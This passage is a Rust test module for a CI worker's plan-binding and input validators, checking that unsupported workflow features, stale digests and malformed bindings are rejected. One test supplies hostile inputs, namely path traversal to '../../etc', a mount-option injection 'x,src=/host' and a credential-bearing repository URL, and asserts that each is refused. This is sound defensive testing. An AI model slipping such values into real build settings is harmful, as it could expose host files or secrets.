        let error = bind_plan(&with_action, &catalog, &bindings).expect_err("uses must fail");
        assert_eq!(error.code, "caller_steps_not_executable");
    }

    #[test]
    fn rejects_semantics_the_worker_would_otherwise_ignore() {
        let catalog = catalog();
        let bindings = bindings(&catalog);

        let mut plan = plan();
        plan.jobs[0].condition = Some("${{ github.ref == 'refs/heads/main' }}".to_string());
        assert_eq!(
            bind_plan(&plan, &catalog, &bindings).unwrap_err().code,
            "condition_not_executable"
        );

        let mut plan = plan();
        plan.jobs[0].env.insert("TOKEN".to_string(), json!("caller"));
        assert_eq!(
            bind_plan(&plan, &catalog, &bindings).unwrap_err().code,
            "caller_environment_not_executable"
        );

        let mut plan = plan();
        plan.jobs[0].reusable_workflow = Some("owner/repo/.github/workflows/x.yml@main".to_string());
        assert_eq!(
            bind_plan(&plan, &catalog, &bindings).unwrap_err().code,
            "reusable_workflow_not_executable"
        );
    }

    #[test]
    fn exact_commit_and_digest_forms_are_required() {
        assert!(validate_commit_sha(COMMIT).is_ok());
        assert!(validate_commit_sha("main").is_err());
        assert!(validate_commit_sha("0123456789ABCDEF0123456789ABCDEF01234567").is_err());
        assert!(validate_digest("profileDigest", RUST_DIGEST).is_ok());
        assert!(validate_digest("profileDigest", "1111").is_err());
    }

    #[test]
    fn rejects_stale_catalog_and_profile_bindings() {
        let plan = plan();
        let catalog = catalog();

        let mut stale_catalog = bindings(&catalog);
        stale_catalog.profile_catalog_digest =
            "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                .to_string();
        assert_eq!(
            bind_plan(&plan, &catalog, &stale_catalog).unwrap_err().code,
            "profile_catalog_digest_mismatch"
        );

        let mut stale_profile = bindings(&catalog);
        stale_profile.jobs.get_mut("build").unwrap().profile_digest =
            "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
                .to_string();
        assert_eq!(
            bind_plan(&plan, &catalog, &stale_profile).unwrap_err().code,
            "profile_digest_mismatch"
        );
    }

    #[test]
    fn bindings_must_cover_base_jobs_exactly() {
        let plan = plan();
        let catalog = catalog();
        let mut missing = bindings(&catalog);
        missing.jobs.remove("report");
        assert_eq!(
            bind_plan(&plan, &catalog, &missing).unwrap_err().code,
            "binding_coverage_mismatch"
        );

        let mut extra = bindings(&catalog);
        extra.jobs.insert(
            "extra".to_string(),
            JobBinding {
                profile: "rust-verify".to_string(),
                profile_digest: RUST_DIGEST.to_string(),
                context_dir: None,
            },
        );
        assert_eq!(
            bind_plan(&plan, &catalog, &extra).unwrap_err().code,
            "binding_coverage_mismatch"
        );
    }

    #[test]
    fn repository_and_context_boundaries_reject_credential_and_mount_injection() {
        assert!(validate_repository_url(
            "https://github.com/gha-indie-worker/example.git"
        )
        .is_ok());
        for value in [
            "ssh://git@github.com/example/repo.git",
            "https://token@github.com/example/repo.git",
            "https://github.com/example/repo.git?ref=main",
            "https://github.com/example/../repo.git",
        ] {
            assert!(validate_repository_url(value).is_err(), "{value}");
        }
        assert!(validate_context_dir(".").is_ok());
        assert!(validate_context_dir("crates/core").is_ok());
        assert!(validate_context_dir("../../etc").is_err());
        assert!(validate_context_dir("x,src=/host").is_err());
    }

    #[test]
    fn rejects_complex_or_oversized_matrix_metadata() {
        let catalog = catalog();
        let bindings = bindings(&catalog);
        let mut complex = plan();
        complex.jobs[0]
            .matrix
            .insert("target".to_string(), json!({"os": "linux"}));
        assert_eq!(
            bind_plan(&complex, &catalog, &bindings).unwrap_err().code,
            "complex_matrix_value_not_supported"
        );

        let mut oversized = plan();
        oversized.jobs[0]
            .matrix
            .insert("target".to_string(), json!("x".repeat(513)));
        assert_eq!(
            bind_plan(&oversized, &catalog, &bindings).unwrap_err().code,
            "invalid_matrix_value"
        );
    }

    #[test]
    fn rejects_duplicate_instances_and_unknown_dependencies() {
        let catalog = catalog();
        let bindings = bindings(&catalog);

        let mut duplicate = plan();
        duplicate.jobs[1].id = duplicate.jobs[0].id.clone();
        assert_eq!(
            bind_plan(&duplicate, &catalog, &bindings).unwrap_err().code,
            "duplicate_job_instance"
        );

        let mut unknown = plan();
        unknown.jobs[2]
            .needs_instances
            .push("missing".to_string());
        assert_eq!(
            bind_plan(&unknown, &catalog, &bindings).unwrap_err().code,
            "unknown_dependency_instance"
        );
    }
}
